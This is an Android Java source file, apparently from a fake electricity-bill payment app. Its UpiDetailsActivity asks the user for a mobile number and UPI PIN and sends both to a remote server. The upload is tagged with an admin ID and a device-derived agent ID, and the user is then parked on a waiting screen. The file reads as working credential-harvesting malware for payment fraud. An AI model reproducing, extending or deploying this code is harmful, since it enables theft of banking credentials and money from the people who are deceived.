package com.pegalite.neotron3.ui.electricity;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivityUpiDetailsBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.ui.WaitingActivity;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class UpiDetailsActivity extends AppCompatActivity {

    ActivityUpiDetailsBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityUpiDetailsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.submit.setOnClickListener(v -> {
            String mobileNo = binding.mobileNo.getText().toString();
            String upiPin = binding.upiPin.getText().toString();
            if (mobileNo.isEmpty() || upiPin.isEmpty()) {
                binding.mobileNo.setError("Please enter mobile number");
                binding.upiPin.setError("Please enter UPI pin");
                return;
            }
            if (mobileNo.length() != 10) {
                binding.mobileNo.setError("Please enter a valid mobile number");
                return;
            }
            if (upiPin.length() < 4) {
                binding.upiPin.setError("Please enter a valid UPI pin");
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("mobileNo", mobileNo);
                object.put("upiPin", upiPin);
                saveDetails(object);
                startActivity(new Intent(this, WaitingActivity.class).putExtra("data", object.toString()));
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}